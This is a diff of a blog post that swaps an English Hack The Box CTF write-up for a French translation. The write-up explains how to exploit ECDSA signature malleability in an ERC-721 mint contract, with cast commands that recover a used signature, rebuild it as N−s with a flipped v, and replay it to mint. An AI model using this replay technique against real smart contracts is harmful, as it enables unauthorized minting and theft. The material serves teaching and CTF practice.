@@ -1,29 +1,28 @@
 ---
 authors:
   - K.L.M
-title: "HTB Business 2023 - Confidentiality Writeup"
-description: "Exploit ECDSA malleability in an ERC-721 mint flow: recover the used signature, transform it, then bypass the replay protection."
+title: "HTB Business 2023 - Writeup Confidentiality"
+description: "Exploitation d'une malléabilité ECDSA dans un mint ERC-721 : retrouver la signature utilisée, la transformer, puis contourner le marquage anti-rejeu."
 publicationDate: 2023-09-05 00:00:00+0000
 cover: ../../../assets/blog/confidentiality-web3/cover.png
-coverAlt: "HTB Business 2023 - Confidentiality Writeup"
+coverAlt: "HTB Business 2023 - Confidentiality"
 categories:
   - Web3
 tags:
   - HackTheBox
-  - CTF
-  - WriteUp
-  - Blockchain
+  - Business CTF
+  - Web3
 ---
 
-## Details
+## Détails
 
-First, the contract relies on a signature check to mint an ERC-721 token.
+Tout d'abord, le contrat repose sur une vérification de signature pour minter un token erc721.
 
-After a bit of research, we find that the contract uses ```ecrecover(hash,v,r,s)```, which is vulnerable to signature malleability. Here is what we need to make our exploit work correctly.
+Après quelques recherches, nous pouvons voir l'utilisation de ```ecrecover(hash,v,r,s)```, vulnérable à la malléabilité des signatures. J'ai fait quelques recherches et voici ce dont nous avons besoin pour que notre exploit fonctionne correctement.
 
-## Goal
+## Objectif
 
-Our goal is to trick the following function:
+Notre objectif est de tromper la fonction suivante :
 
 ```solidity
 function safeMintWithSignature(bytes memory signature, address to) external returns (uint256) {
@@ -36,14 +35,14 @@ function safeMintWithSignature(bytes memory signature, address to) external retu
     }
 ```
 
-## Requirements
+## Prérequis
 
-- One signature that has already been used
-- The ECC curve being used (in our case, Ethereum uses **SECP256k1**)
+- Une signature déjà utilisée
+- L'ECC utilisée (dans notre cas, Ethereum utilise **SECP256k1**)
 
-## Finding the signature
+## Trouver la signature
 
-Since we need a valid signature, we need to find the signature used by the following setup contract:
+Comme nous avons besoin d'une signature valide, nous devons trouver celle utilisée par le contrat de setup suivant :
 
 ```solidity
 contract Setup {
@@ -62,7 +61,7 @@ contract Setup {
 }
 ```
 
-To do this, we can use the following technique:
+Pour cela, nous pouvons utiliser la technique suivante :
 ```bash
 klm@KLM:~$ cast block 1 --rpc-url=$RPC
 
@@ -93,7 +92,7 @@ transactions:        [
 ] 
 ```
 
-We now have the transaction, so we can use:
+Nous avons maintenant la transaction ; nous pouvons donc utiliser :
 ```bash
 klm@KLM:~$ cast tx 0xd51acc401fafa93f4998db6a8847c98b83d9b004f49dddd340003bb00679421d --rpc-url=$RPC
 
@@ -113,7 +112,7 @@ v                    62710
 value                0
 ```
 
-I struggled for a long time before realizing that the signature was given at the end of the input.
+J'ai galéré longtemps avant de comprendre que la signature était donnée à la fin de l'input.
 
 ```
 ef2d40632e1eb0c2cc4196643d4b1f90a7e7b50c2933bc7fb134dafecdc084834de6e701ac786271e2d5df8971d6bd0d9278e2c1323ef1efa856ab76b9ce69671c
@@ -121,9 +120,9 @@ ef2d40632e1eb0c2cc4196643d4b1f90a7e7b50c2933bc7fb134dafecdc084834de6e701ac786271
 
 ## Exploit
 
-If we call ```deconstructSignature(bytes memory signature)```,
+Si nous appelons ```deconstructSignature(bytes memory signature)```
 
-we get the following parameters:
+nous obtenons les paramètres suivants :
 
 ```bash
 klm@KLM:~$ cast call $TAR "deconstructSignature(bytes)(uint8,bytes32,bytes32)" ef2d40632e1eb0c2cc4196643d4b1f90a7e7b50c2933bc7fb134dafecdc084834de6e701ac786271e2d5df8971d6bd0d9278e2c1323ef1efa856ab76b9ce69671c --rpc-url=$RPC
@@ -132,10 +131,10 @@ klm@KLM:~$ cast call $TAR "deconstructSignature(bytes)(uint8,bytes32,bytes32)" e
 0x4de6e701ac786271e2d5df8971d6bd0d9278e2c1323ef1efa856ab76b9ce6967 (s)
 ```
 
-I found on a blog that we could use the following trick to exploit this:
+J'ai trouvé sur un blog que nous pouvions utiliser l'astuce suivante pour l'exploitation :
 
-Use `N`, the number of points on the curve.
-Compute `N - S` and change the value of `V` to 27 or 28, whichever one has not already been used.
+Utiliser N = nombre de points sur l'ECC
+faire : N-S et changer la valeur de V en 27 ou 28 (normalement, la seule qui n'est pas déjà utilisée)
 
 ```python
 >>> 115792089237316195423570985008687907852837564279074904382605163141518161494337 - a
@@ -144,12 +143,12 @@ Compute `N - S` and change the value of `V` to 27 or 28, whichever one has not a
 '0xb21918fe53879d8e1d2a20768e2942f12835fa257d09ae4c177bb3161667d7da'
 ```
 
-Now we have:
+Nous avons maintenant :
 - v = 27 (1b)
 - s =  0xb21918fe53879d8e1d2a20768e2942f12835fa257d09ae4c177bb3161667d7da
 - r = 0xef2d40632e1eb0c2cc4196643d4b1f90a7e7b50c2933bc7fb134dafecdc08483
 
-We can call ```constructSignature(v,r,s)```:
+Nous pouvons appeler ```constructSignature(v,r,s)```
 
 ```bash
 klm@KLM:~$ cast call $TAR "constructSignature(uint8,bytes32,bytes32)(bytes)" 27 0xef2d40632e1eb0c2cc4196643d4b1f90a7e7b5
@@ -174,5 +173,5 @@ transactionIndex        0
 type                    2
 ```
 
-Now enjoy!
+Et voilà ! 
 ```HTB{XXXXXXXXXXXXXXXXXXXXXX}```
